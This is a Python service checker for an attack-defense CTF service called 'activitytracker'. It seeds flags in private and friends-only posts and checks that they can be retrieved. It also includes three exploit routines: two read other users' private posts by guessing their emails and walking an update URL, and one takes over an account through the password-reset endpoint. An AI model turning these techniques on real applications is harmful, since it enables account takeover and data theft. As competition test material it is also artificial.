#!/usr/bin/env python3
import hashlib
import html

import requests
from enochecker import BaseChecker, BrokenServiceException, EnoException, run
from enochecker.storeddict import DB_DEFAULT_DIR, DB_GLOBAL_CACHE_SETTING
from enochecker.utils import assert_in
import random
import string
import barnum
import os
from PIL import Image
import secrets
import re

from enochecker_core import CheckerTaskMessage


class ActivitytrackerChecker(BaseChecker):
    """
    Change the methods given here, then simply create the class and .run() it.
    Magic.
    A few convenient methods and helpers are provided in the BaseChecker.
    ensure_bytes ans ensure_unicode to make sure strings are always equal.
    As well as methods:
    self.connect() connects to the remote server.
    self.get and self.post request from http.
    self.chain_db is a dict that stores its contents to a mongodb or filesystem.
    conn.readline_expect(): fails if it's not read correctly
    To read the whole docu and find more goodies, run python -m pydoc enochecker
    (Or read the source, Luke)
    """

    # EDIT YOUR CHECKER PARAMETERS
    flag_variants = 3
    noise_variants = 2
    havoc_variants = 3
    exploit_variants = 3
    service_name = "activitytracker"
    port = 4242  # The port will automatically be picked up as default by self.connect and self.http.

    # END CHECKER PARAMETERS

    def __init__(self, task: CheckerTaskMessage,
                 storage_dir: str = DB_DEFAULT_DIR,
                 use_db_cache: bool = DB_GLOBAL_CACHE_SETTING,
                 json_logging: bool = True, ):
        super().__init__(
            task,
            storage_dir,
            use_db_cache,
            json_logging)
        self.http_session.verify = True

    @staticmethod
    def generate_random_image(filename):
        im = Image.open('images/profile.png')
        # im = Image.new('RGB', (30, 30))
        pixels = im.load()
        for x in range(min(30, im.size[0])):
            for y in range(min(30, im.size[1])):
                pixels[x, y] = (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
        im.save(filename, format='png')
        return filename

    def register_user(self, email: str, password: str, image_path: str = ""):
        filename = "/tmp/" + secrets.token_urlsafe(10) + ".png"
        if image_path:
            filename = image_path
        else:
            self.generate_random_image(filename)
        with open(filename, 'rb') as verification_image:
            resp = self.http_post("/auth/signup",
                                  data={
                                      "email": email,
                                      "password": password
                                  },
                                  files={
                                      "image": verification_image
                                  })
        if resp.status_code != 303:
            raise EnoException(f"Unexpected status code while registering user: {resp.status_code}")

    def login_user(self, email: str, password: str):
        resp = self.http_post("/auth/login",
                              data={
                                  "email": email,
                                  "password": password
                              })
        if resp.status_code != 303:
            raise EnoException(f"Unexpected status code while registering user: {resp.status_code}")

    @staticmethod
    def generate_matching_emails(person1, person2, company):
        tld = barnum.create_email().split(".")[-1]
        domain = f"{company.lower().replace(' ', '')}.{tld}"
        email_patterns = [
            lambda x: f"{x[0][0]}.{x[1]}",
            lambda x: f"{x[0]}.{x[1]}",
            lambda x: f"{x[0]}{x[1]}",
            lambda x: f"{x[0][0]}{x[1]}",
            lambda x: f"{x[1]}",
            lambda x: f"{x[0]}",
            lambda x: f"{x[0]}{x[1][0]}",
        ]
        pattern = random.choice(email_patterns)
        return (
            f"{pattern(person1)}@{domain}",
            f"{pattern(person2)}@{domain}",
        )

    def putflag(self):  # type: () -> None
        """
        This method stores a flag in the service.
        In case multiple flags are provided, self.variant_id gives the appropriate index.
        The flag itself can be retrieved from self.flag.
        On error, raise an Eno Exception.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
        if self.variant_id == 0:
            # First we need to register a user
            firstname, lastname = barnum.create_name()
            company = barnum.create_company_name()
            jobtitle = barnum.create_job_title()
            password = barnum.create_pw(length=10)

            boss_firstname, boss_lastname = barnum.create_name()
            boss_password = barnum.create_pw(length=10)

            email, boss_email = self.generate_matching_emails((firstname.lower(), lastname.lower()),
                                                              (boss_firstname.lower(), boss_lastname.lower()),
                                                              company)

            self.register_user(email, password)


            self.generate_random_posts(random.randint(0, 3),
                                       data={"firstname": firstname, "lastname": lastname, "company": company,
                                             "jobtitle": jobtitle, "password": password,
                                             "boss_firstname": boss_firstname, "boss_lastname": boss_lastname})

            self.http_post('/posts/insert', files={
                "body": f"I love working here at {company} as a {jobtitle}. We even have our own gym! My boss {boss_firstname} {boss_lastname} is great, and I'll get a promotion soon! Come work here as well! Cheers, {firstname} {lastname}",
                "visibility": "public",
                "protected": "true"
            })

            self.generate_random_posts(random.randint(0, 3),
                                       data={"firstname": firstname, "lastname": lastname, "company": company,
                                             "jobtitle": jobtitle, "password": password,
                                             "boss_firstname": boss_firstname, "boss_lastname": boss_lastname})

            self.http_get('/auth/logout')
            self.register_user(boss_email, boss_password)
            self.http_post('/posts/insert', files={
                "body": self.flag,
                "visibility": "private",
                "protected": "true"
            })
            self.http_get('/auth/logout')

            # Save the generated values for the associated getflag() call.
            self.chain_db = {
                "username": boss_email,
                "password": boss_password,
            }

        elif self.variant_id == 1:
            # First we need to register a user
            firstname, lastname = barnum.create_name()
            company = barnum.create_company_name()
            jobtitle = barnum.create_job_title()
            password = barnum.create_pw(length=10)
            email = barnum.create_email(name=(firstname, lastname)).lower()

            self.register_user(email, password)

            self.generate_random_posts(random.randint(0, 3),
                                       data={"firstname": firstname, "lastname": lastname, "company": company,
                                             "jobtitle": jobtitle, "password": password}, templates='simple')

            self.http_post('/posts/insert', files={
                "body": f"A friend of mine keeps posting their passwords! LOL!",
                "visibility": "public",
                "protected": "true"
            })

            self.generate_random_posts(random.randint(0, 3),
                                       data={"firstname": firstname, "lastname": lastname, "company": company,
                                             "jobtitle": jobtitle, "password": password}, templates='simple')

            self.http_get('/auth/logout')

            original_email = email
            firstname, lastname = barnum.create_name()
            checker_email = barnum.create_email(name=(firstname, lastname)).lower()
            checker_password = barnum.create_pw(length=10)

            self.register_user(checker_email, checker_password)
            self.http_get('/auth/logout')

            firstname, lastname = barnum.create_name()
            company = barnum.create_company_name()
            jobtitle = barnum.create_job_title()
            password = barnum.create_pw(length=10)
            email = barnum.create_email(name=(firstname, lastname)).lower()

            self.register_user(email, password)

            self.http_post('/posts/insert', files={
                "body": self.flag,
                "visibility": "friends",
                "protected": "true"
            })

            self.http_post('/friends/insert', files={
                "email": original_email
            })
            self.http_post('/friends/insert', files={
                "email": checker_email
            })

            self.http_get('/auth/logout')

            # Save the generated values for the associated getflag() call.
            self.chain_db = {
                "username": checker_email,
                "password": checker_password,
            }
        elif self.variant_id == 2:
            # First we need to register a user
            firstname, lastname = barnum.create_name()
            company = barnum.create_company_name()
            jobtitle = barnum.create_job_title()
            password = barnum.create_pw(length=10)

            boss_firstname, boss_lastname = barnum.create_name()
            boss_password = barnum.create_pw(length=10)

            email, boss_email = self.generate_matching_emails((firstname.lower(), lastname.lower()),
                                                              (boss_firstname.lower(), boss_lastname.lower()),
                                                              company)

            self.register_user(email, password)

            self.generate_random_posts(random.randint(0, 3),
                                       data={"firstname": firstname, "lastname": lastname, "company": company,
                                             "jobtitle": jobtitle, "password": password,
                                             "boss_firstname": boss_firstname, "boss_lastname": boss_lastname})

            self.http_post('/posts/insert', files={
                "body": "Private posts are useful to save passwords ^^ Nice ^^",
                "visibility": "public",
                "protected": "true"
            })

            self.http_post('/posts/insert', files={
                "body": self.flag,
                "visibility": "private",
                "protected": "true"
            })

            self.generate_random_posts(random.randint(0, 3),
                                       data={"firstname": firstname, "lastname": lastname, "company": company,
                                             "jobtitle": jobtitle, "password": password,
                                             "boss_firstname": boss_firstname, "boss_lastname": boss_lastname})

            self.http_get('/auth/logout')


            # Save the generated values for the associated getflag() call.
            self.chain_db = {
                "username": email,
                "password": password,
            }
        else:
            raise EnoException("Wrong variant_id provided")

    def check_pages(self, flag):
        page = 0
        while 1:
            resp = self.http_get(f"/posts/view/{page}")
            t = html.unescape(resp.text)
            if "Activities by" not in t:
                return ""
            if flag in t:
                return t
            page += 1

    def check_mine(self):
        resp = self.http_get(f"/posts/my")
        t = html.unescape(resp.text)
        return t

    def check_friends(self):
        resp = self.http_get(f"/posts/friends")
        t = html.unescape(resp.text)
        return t

    def getflag(self):  # type: () -> None
        """
        This method retrieves a flag from the service.
        Use self.flag to get the flag that needs to be recovered and self.round to get the round the flag was placed in.
        On error, raise an EnoException.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
        if self.variant_id == 0 or self.variant_id == 1 or self.variant_id == 2:
            # First we check if the previous putflag succeeded!
            try:
                username: str = self.chain_db["username"]
                password: str = self.chain_db["password"]
            except (IndexError, KeyError) as ex:
                self.debug(f"error getting notes from db: {ex}")
                raise BrokenServiceException("Previous putflag failed.")

            self.login_user(username, password)

            # Let´s obtain our note.
            if self.variant_id == 1:
                resp = self.check_friends()
            else:
                resp = self.check_mine()

            self.http_get('/auth/logout')
            assert_in(
                self.flag, resp, "Resulting flag was found to be incorrect"
            )
        else:
            raise EnoException("Wrong variant_id provided")


    def generate_workout(self):
        ex = [
            "Pushup",
            "Pullup",
            "Chinup",
            "Burpee",
            "Plank",
            "Squats",
            "Run",
            "Jump",
            "Lunges",
            "Crunches",
            "Rows"
        ]
        w = []
        for i in range(random.randint(5, 15)):
            w.append(random.choice(ex) + " x " + str(random.randint(5, 50)))
        return "Today's workout: " + ", ".join(w)


    def generate_random_posts(self, n=1, templates="any", data=None, private=2):
        """
        Creates n posts using the defined templates. private=0: public, 1: private, 2: random

        User should already be logged in.
        """
        posts = []
        directory = r"/checker/post_templates/"
        if not os.path.exists(directory):
            directory = r"post_templates"
        for filename in os.listdir(directory):
            if filename.endswith(".template"):
                f = os.path.join(directory, filename)
                if templates == "any" or templates in f:
                    with open(f) as template:
                        posts.extend(list(map(lambda x: x.strip(), template.readlines())))
            else:
                continue

        if not posts:
            raise EnoException("No matching template found.")

        for i in range(n):
            p = random.random() > 0.5
            if private == 1:
                p = False
            elif private == 0:
                p = True
            while 1:
                try:
                    if random.random() < 0.3:
                        body = random.choice(posts).format(**data) if data else random.choice(posts)
                    else:
                        body = self.generate_workout()
                    self.http_post('/posts/insert', files={
                        "body": body,
                        "visibility": "public" if p else "private",
                        "protected": "true" if random.random() < 0.1 else "false"
                    })
                    break
                except:
                    pass

    def putnoise(self):  # type: () -> None
        """
        This method stores noise in the service. The noise should later be recoverable.
        The difference between noise and flag is, that noise does not have to remain secret for other teams.
        This method can be called many times per round. Check how often using self.variant_id.
        On error, raise an EnoException.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
        if self.variant_id == 0 or self.variant_id == 1:
            # A public or private post
            firstname, lastname = barnum.create_name()
            password = barnum.create_pw(length=10)
            email = barnum.create_email(name=(firstname, lastname)).lower()
            company = barnum.create_company_name()
            jobtitle = barnum.create_job_title()
            text = secrets.token_urlsafe(128)

            self.register_user(email, password)

            self.generate_random_posts(n=random.randint(0, 3),
                                       data={"firstname": firstname, "lastname": lastname, "company": company,
                                             "jobtitle": jobtitle, "password": password}, templates="simple")
            self.http_post('/posts/insert', files={
                "body": text,
                "visibility": "public" if self.variant_id == 0 else "private",
                "protected": "true"
            })
            self.generate_random_posts(n=random.randint(0, 3),
                                       data={"firstname": firstname, "lastname": lastname, "company": company,
                                             "jobtitle": jobtitle, "password": password}, templates="simple")

            self.http_get('/auth/logout')
            self.chain_db = {
                "username": email,
                "password": password,
                "text": text
            }

        else:
            raise EnoException("Wrong variant_id provided")

    def getnoise(self):  # type: () -> None
        """
        This method retrieves noise in the service.
        The noise to be retrieved is inside self.flag
        The difference between noise and flag is, that noise does not have to remain secret for other teams.
        This method can be called many times per round. Check how often using variant_id.
        On error, raise an EnoException.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
        if self.variant_id == 0:
            # public post
            try:
                username: str = self.chain_db["username"]
                text: str = self.chain_db["text"]
            except (IndexError, KeyError) as ex:
                self.debug(f"error getting notes from db: {ex}")
                raise BrokenServiceException("Previous putflag failed.")

            # Let´s obtain our note.
            resp = self.check_pages(text)

            assert_in(
                text, resp, "Resulting flag was found to be incorrect"
            )
            assert_in(
                username, resp, "Posts don't contain correct usernames"
            )
        elif self.variant_id == 1:
            # private post
            try:
                username: str = self.chain_db["username"]
                password: str = self.chain_db["password"]
                text: str = self.chain_db["text"]
            except (IndexError, KeyError) as ex:
                self.debug(f"error getting notes from db: {ex}")
                raise BrokenServiceException("Previous putflag failed.")

            self.login_user(username, password)

            # Let´s obtain our note.
            resp = self.check_mine()

            self.http_get('/auth/logout')
            assert_in(
                text, resp, "Resulting flag was found to be incorrect"
            )
            assert_in(
                username, resp, "Resulting flag was found to be incorrect"
            )
        else:
            raise EnoException("Wrong variant_id provided")

    def havoc(self):  # type: () -> None
        """
        This method unleashes havoc on the app -> Do whatever you must to prove the service still works. Or not.
        On error, raise an EnoException.
        :raises EnoException on Error
        :return This function can return a result if it wants
                If nothing is returned, the service status is considered okay.
                The preferred way to report Errors in the service is by raising an appropriate EnoException
        """
        if self.variant_id == 0:
            # Check edit functionality
            firstname, lastname = barnum.create_name()
            password = barnum.create_pw(length=10)
            email = barnum.create_email(name=(firstname, lastname))
            text = secrets.token_urlsafe(128)

            self.register_user(email, password)

            self.http_post('/posts/insert', files={
                "body": text,
                "visibility": "public" if self.variant_id == 0 else "private",
                "protected": "false"
            })
            resp = self.check_mine()
            t = resp.split("\">Edit</a>")[0]
            url = t.split("href=\"")[-1]

            resp = self.http_get(url)
            self.http_get('/auth/logout')
            assert_in(text, html.unescape(resp.text))
        elif self.variant_id == 1:
            # check delete functionality
            firstname, lastname = barnum.create_name()
            password = barnum.create_pw(length=10)
            email = barnum.create_email(name=(firstname, lastname))

            self.register_user(email, password)

            random_validation_text = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(64))

            self.http_post('/posts/insert', files={
                "body": random_validation_text,
                "visibility": "public",
                "protected": "false"
            })
            resp = html.unescape(self.http_get('/posts/my').text)
            assert_in(random_validation_text, resp)
            t = resp.split("\">Delete</a>")[0]
            url = t.split("href=\"")[-1]
            self.http_get(url)
            resp = html.unescape(self.http_get('/posts/my').text)
            self.http_get('/auth/logout')
            if random_validation_text in resp:
                raise BrokenServiceException(
                    "Received unexpected response.",
                    internal_message=f"{random_validation_text} is in {resp}",
                )
        elif self.variant_id == 2:
            try:
                self.http_get('/posts/delete_old')
            except Exception as e:
                pass
        # TODO: check file upload
        else:
            raise EnoException("Wrong variant_id provided")

    def exploit(self):
        """
        This method was added for CI purposes for exploits to be tested.
        Will (hopefully) not be called during actual CTF.
        :raises EnoException on Error
        :return This function can return a result if it wants
                If nothing is returned, the service status is considered okay.
                The preferred way to report Errors in the service is by raising an appropriate EnoException
        """
        if self.variant_id == 0:
            flag = self.exploit1()
            if flag:
                return flag
            raise BrokenServiceException("Exploit does not work")
        elif self.variant_id == 1:
            flag = self.exploit2()
            if flag:
                return flag
            raise BrokenServiceException("Exploit does not work")
        elif self.variant_id == 2:
            flag = self.exploit3()
            if flag:
                return flag
            raise BrokenServiceException("Exploit does not work")
        else:
            raise EnoException("Wrong variant_id provided")

    pattern1 = re.compile("My boss (\\w+ \\w+) is great. .* Cheers, (\\w+ \\w+)")
    pattern2 = re.compile("by (.*@.*)")
    pattern3 = re.compile("A friend of mine keeps posting their passwords! LOL!")
    pattern4 = re.compile("Private posts are useful to save passwords")

    @staticmethod
    def guess_boss_email(email, name1, name2):
        # Guesses another user's email based on the known user's email pattern (email), the new user's full name (name1), and the known user's full name (name2)
        email_patterns = [
            lambda x: f"{x[0][0]}.{x[1]}",
            lambda x: f"{x[0]}.{x[1]}",
            lambda x: f"{x[0]}{x[1]}",
            lambda x: f"{x[0][0]}{x[1]}",
            lambda x: f"{x[1]}",
            lambda x: f"{x[0]}",
            lambda x: f"{x[0]}{x[1][0]}",
        ]
        user_name = name2.lower().split(" ")
        for p in email_patterns:
            e = p(user_name)
            e += "@" + email.split("@")[-1]
            if email == e:
                return p(name1.lower().split(" ")) + "@" + email.split("@")[-1]

    def exploit1(self):
        # Create new account
        email = f"{secrets.token_urlsafe(16)}@gmail.com"
        password = secrets.token_urlsafe(16)
        self.register_user(email, password)
        page = 0
        while page < 5:
            resp = self.http_get(f"/posts/view/{page}")
            t = html.unescape(resp.text)
            if "Activities by" not in t:
                break
            page += 1
            # Split post list by user
            user_posts = t.split("Activities")
            for section in user_posts:
                # find user's email and all posts matching pattern
                try:
                    email = re.search(self.pattern2, section).group(1).strip()
                    post = re.search(self.pattern1, section).groups()
                    if not post or not email:
                        continue
                    # generate email to attack
                    email_to_attack = self.guess_boss_email(email, post[0], post[1])
                    n = 0
                    self.debug(f"attacking {email_to_attack}")
                    while True:
                        n += 1
                        # get flag by editing post based on known email
                        resp = self.http_get(f"/posts/update/{email_to_attack}/{n}")
                        if resp.status_code != 200:
                            break

                        t = html.unescape(resp.text)
                        if "form" not in t:
                            break
                        f = self.search_flag(t)
                        if f:
                            return f
                except:
                    pass

    def exploit2(self):
        # Create new account
        password_my = secrets.token_urlsafe(16)
        page = 0
        while page < 5:
            resp = self.http_get(f"/posts/view/{page}")
            t = html.unescape(resp.text)
            if "Activities by" not in t:
                break
            page += 1
            # Split post list by user
            user_posts = t.split("Activities")
            for section in user_posts:
                # find user's email and all posts matching pattern
                try:
                    email = re.search(self.pattern2, section).group(1).strip()
                    post = re.search(self.pattern3, section)
                    if not post:
                        continue
                    image_name = f"/tmp/tmp.png"
                    self.generate_random_image(image_name)
                    print(email)
                    self.register_user(f"{email}.{secrets.token_urlsafe(2)}.{secrets.token_urlsafe(2)}.{secrets.token_urlsafe(2)}", password_my, image_name)
                    self.http_get('/auth/logout')
                    with open(image_name, 'rb') as image:
                        self.http_post('/auth/forgot', data={
                            "email": email,
                            "password": "hacked1234567890"
                        }, files={
                            "image": image
                        })
                    # get flag
                    resp = self.http_get(f"/posts/friends")
                    print(resp)
                    t = html.unescape(resp.text)
                    f = self.search_flag(t)
                    if f:
                        return f
                except Exception as e:
                    pass

    def exploit3(self):
        # Create new account
        email = f"{secrets.token_urlsafe(16)}@gmail.com"
        password = secrets.token_urlsafe(16)
        self.register_user(email, password)
        page = 0
        while page < 5:
            resp = self.http_get(f"/posts/view/{page}")
            t = html.unescape(resp.text)
            if "Activities by" not in t:
                break
            page += 1
            # Split post list by user
            user_posts = t.split("Activities")
            for section in user_posts:
                # find user's email and all posts matching pattern
                try:
                    email = re.search(self.pattern2, section).group(1).strip()
                    post = re.search(self.pattern4, section)
                    if not post or not email:
                        continue
                    # generate email to attack
                    n = 0
                    self.debug(f"attacking {email}")
                    while True:
                        n += 1
                        # get flag by editing post based on known email
                        resp = self.http_get(f"/posts/update/{email}/{n}")
                        if resp.status_code != 200:
                            break

                        t = html.unescape(resp.text)
                        if "form" not in t:
                            break
                        f = self.search_flag(t)
                        if f:
                            return f
                        if n > 20:
                            break
                except:
                    pass

app = ActivitytrackerChecker.service  # This can be used for uswgi.
if __name__ == "__main__":
    run(ActivitytrackerChecker)
